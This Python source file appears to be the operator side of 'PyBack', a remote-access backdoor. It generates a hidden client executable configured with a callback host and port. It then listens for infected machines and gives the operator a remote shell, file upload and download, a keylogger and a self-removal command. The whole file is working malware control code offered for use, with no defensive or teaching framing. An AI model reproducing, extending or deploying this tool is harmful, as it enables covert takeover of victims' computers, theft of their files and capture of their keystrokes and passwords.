#!/usr/bin/python

#import the required modules
import socket
import os
import struct
import shutil



##############################################
#                                            #
#                   v1.2                     #
#           Coded by Blueman678              #
#   GitHub: https://github.com/Blueman678/   #
#                                            #
##############################################



class Server(): #class Server: define the server properties
    def __init__(self, client = None):
        self.client = client

    def send(self, data): #custom send function
        pkt = struct.pack('>I', len(data)) + data
        self.client.sendall(pkt)

    def recv(self): #custom recv function
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)

    def recvall(self, n): #format the receipts packets
        packet = b''
        while len(packet) < n:
            frame = self.client.recv(n - len(packet))
            if not frame:
                return None
            packet += frame
        return packet




def main_menu(): #define the main menu
    while True:
        os.system(clear)
        print("""
        1. Create and configure a backdoor
        2. Listen to a port and remote a backdoor
        3. Exit
        """)
        choice = input("\n Enter your choice: ")
        if int(choice) == 1:
            create()
        if int(choice) == 2:
            listener()
        elif int(choice) == 3:
            exit()


def create(): #configure the client with ip and port
    os.system(clear)
    HOST = input("Enter the host/ip of the client: ")
    PORT = input("Enter the port of the client: ")
    exe = input("Do you want to create an executable (y/n): ")
    with open('data/client.txt', 'r') as file:
        content = file.readlines()
    content[content.index("HOST = '127.0.0.1'\n")] = f"HOST = '{HOST}'\n"
    content[content.index("PORT = 51025\n")] = f"PORT = {PORT}\n"
    with open('client.py', 'w') as file:
        file.write(''.join(content))
    if exe == 'y':
        os.system(clear)
        print('Creating the executable... This may take a while.')
        os.system("pyinstaller -wF --clean --onefile --distpath exe --log-level WARN client.py")
        os.remove('client.spec')
        os.remove('client.py')
        shutil.rmtree('build')
        print("Executable file succesfully created in folder 'exe'!\n")
    else:
        print("Python file succesfully created!\n")
    os.system('pause')


def listener(): #define the socket and listen for connections
    HOST = input("Enter your host/ip: ")
    PORT = int(input("Enter your port: "))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(1)
    print(f"\nServer {HOST} is listening on port {PORT}...")
    while True:
        client, address = sock.accept()
        global server
        server = Server(client)
        print(f"Client {address[0]} on port {address[1]} is connected!")
        os.system('pause')
        interpreter(sock, client)


def interpreter(sock, client): #wait for commands and interpret them
    os.system(clear)
    print("Enter a command or 'help', for a list of the availables commands")
    while True:
        command = input('>>> ')
        try:
            if command == 'exit':
                server.send('exit'.encode())
                client.close()
                sock.close()
                exit()
            else:
                command = command.split(" ")
                if len(command) > 1:
                    exec(f"{command[0]}('{command[1]}')")
                else:
                    exec(f"{command[0]}()")
        except NameError:
            print("Command not found! Enter 'help' to see the availables commands.")



def help(): #help command: show the availables commands
    print(
    """
    Here are the differents availables commands:

    \033[4mPyBack commands:\033[0m
    - background: Put the client session in background.
    - exit: Exit and kill the client session.
    - remove: Remove all the files and kill the client session.

    \033[4mExploit commands:\033[0m
    - cmd: Open a shell on the client machine.
    - upload: Upload a file to the client.
    - download: Download a file from the client.
    - keylogger [start/stop]: Start or stop a keylogger and get the file with the keylogs.
    \n
    """)



def background():
    server.send("background".encode())
    main_menu()


def remove():
    server.send("remove".encode())
    main_menu()



def upload(): #upload command: upload a file to the client
    server.send("upload".encode())
    local_path = input("Please enter the path of your local file: ")
    try:
        with open(local_path, 'rb') as file:
            while True:
                a = file.read(1024)
                if not a:
                    break
                server.send(a)
        server.send(local_path.split('/')[-1].encode())
        print('File sent succesful!')
    except FileNotFoundError:
        print("File not found!")


def download(): #download command: download a file from the client
    server.send("download".encode())
    client_path = input("Please enter the path of the client file: ")
    server.send(client_path.encode())
    file_content = server.recv()
    file_name = server.recv()
    with open(file_name, 'wb') as file:
        file.write(file_content)
    print("File received succesful!")



def cmd(): #cmd command: open a shell on the client machine
    os.system(clear)
    server.send('cmd'.encode())
    while True: 
        dir = server.recv().decode().strip()
        cmd = input(dir + ' ')
        if cmd != 'exit':
            server.send(cmd.encode())
            response = server.recv().decode('cp850').strip()
            print(response)
        else:
            server.send('exit'.encode())
            break



def keylogger(option): #keylogger command: save the keystrokes from the client
    server.send(f'keylogger {option}'.encode())
    if option == 'stop':
        print('Killing keylogger...')
        keylogs = server.recv().decode()
        with open('keylogs.txt', 'a') as file:
            file.write(keylogs)
        print("Keylogger is killed! All the keylogs are in the file 'keylogs.txt'.")
    elif option == 'start':
        print("Keylogger is starting...")



if os.name == 'nt':
    clear = 'cls'
else :
    clear = 'clear'
main_menu()

    
